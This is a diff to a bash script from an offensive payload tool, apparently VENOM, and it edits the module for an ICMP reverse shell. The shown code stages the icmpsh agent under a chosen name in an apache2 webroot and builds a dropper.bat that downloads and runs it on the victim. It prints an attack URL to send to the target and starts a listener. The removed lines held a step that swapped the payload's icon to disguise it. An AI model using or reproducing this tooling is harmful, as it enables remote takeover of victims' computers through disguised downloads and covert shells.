@@ -11248,9 +11248,9 @@ fi
 # ICMP (ping) REVERSE SHELL
 # original project by: @Daniel Compton
 # -
-# This module introduces the changing of payload icon,
-# payload final name, port all files to apache2 webroot,
-# and builds dropper.bat (to download/exec our payload).
+# This module introduces the changing of payload.exe finalname,
+# builds dropper.bat (remote download/exc of payload.exe) and
+# port all files to apache2 webroot, to trigger URL access download.
 # ------------------------------------
 sh_icmp_shell () {
 # get user input to build agent
@@ -11263,12 +11263,12 @@ rpath=$(zenity --title="☠ Enter Upload Path (target dir) ☠" --text "example:
 
 ## setting default values in case user have skip this ..
 if [ -z "$target" ]; then
-   echo ${RedF}[x]${white} ERROR: We must provide the [${RedF} target ${white}] ip address ..${Reset};
+   echo "${RedF}[x]${white} We must provide the [${RedF} target ${white}] ip address ([${RedF}ERR${white}])"
    sleep 3; sh_exit
 fi
 ext=$(echo $slave|cut -c 1)
 if [ "$ext" = "f" ]; then
-   echo ${RedF}[x]${white} ERROR: Payload name must NOT start with [${RedF} f ${white}] character ..${Reset};
+   echo "${RedF}[x]${white} Payload name must NOT start with [${RedF} f ${white}] character ([${RedF}ERR${white}])"
    sleep 3; sh_exit
 fi
 if [ -z "$lhost" ]; then
@@ -11302,22 +11302,9 @@ sleep 2
 echo "[☠] Checking ICMP replies status ..";sleep 1
 LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
 if [ "$LOCALICMP" -eq 0 ]; then
-   echo "${RedF}[x]${white} ICMP Replies enabled (disable temporarily)${white}"
+   echo "${RedF}[x]${white} ICMP Replies enabled (disable temporarily [${GreenF}OK${white}])${white}"
    sysctl -w net.ipv4.icmp_echo_ignore_all=1 > /dev/null 2>&1
-   ICMPDIS="disabled"
-fi
-
-
-## Resource Hacker - change payload icon
-cp $IPATH/bin/icmpsh/icmpsh.exe $IPATH/output/icmpsh.exe > /dev/nul 2>&1
-wine_c=$(cat $IPATH/settings|grep -m 1 'WINE_DRIVEC'|cut -d '=' -f2)
-RhI="$wine_c/Program Files/Resource Hacker/ResourceHacker.exe"
-if [ "$ArCh" = "x64" ]; then
-   RhI="$wine_c/Program Files (x86)/Resource Hacker/ResourceHacker.exe"
-fi
-if [ -f "$RhI" ]; then
-   echo "[☠] Resource Hacker - changing $slave.exe icon ..";sleep 1
-   xterm -T "VENOM - RH change binary icon" -geometry 110x23 -e "$arch \"$RhI\" -open \"$IPATH/output/icmpsh.exe\" -save \"$IPATH/output/$slave.exe\" -action addskip -res \"$IPATH/bin/icons/Windows-black.ico\" -mask ICONGROUP,MAINICON, && sleep 1"
+   ICMPDIS="disabled";sleep 2
 fi
 
 
@@ -11330,7 +11317,7 @@ echo "exit" >> $IPATH/output/$N4m.bat
 
 ## Copy ALL files to apache2 webroot
 echo "[☠] Porting ALL files to apache2 webroot ..";sleep 2
-cp $IPATH/output/icmpsh.exe $ApAcHe/$slave.exe > /dev/nul 2>&1 
+cp $IPATH/bin/icmpsh/icmpsh.exe $IPATH/output/$slave.exe > /dev/nul 2>&1
 cp $IPATH/output/$slave.exe $ApAcHe/$slave.exe > /dev/nul 2>&1
 cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat > /dev/nul 2>&1
 
@@ -11338,7 +11325,7 @@ cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat > /dev/nul 2>&1
 ## Print attack vector on terminal
 echo "[☠] Starting apache2 webserver ..";sleep 1
 echo "---"
-echo "- SEND THE URL GENERATED TO TARGET HOST"
+echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
 echo "- ATTACK VECTOR: http://$lhost/$N4m.bat"
 echo "---"
 echo "[☠] Launching Listener, waiting for inbound connection ..";sleep 1
@@ -11350,7 +11337,7 @@ cd $IPATH
 ## Enable ICMP ping replies
 # ONLY IF.. they have been disabled before.
 if [ "$ICMPDIS" = "disabled" ]; then
-   echo "${white}[${GreenF}✔${white}] Enabling Local ICMP Replies again ..${white}";sleep 2
+   echo "${white}[${GreenF}✔${white}] Enabling Local ICMP Replies again ([${GreenF}OK${white}])${white}";sleep 2
    sysctl -w net.ipv4.icmp_echo_ignore_all=0 > /dev/null 2>&1
 fi
 
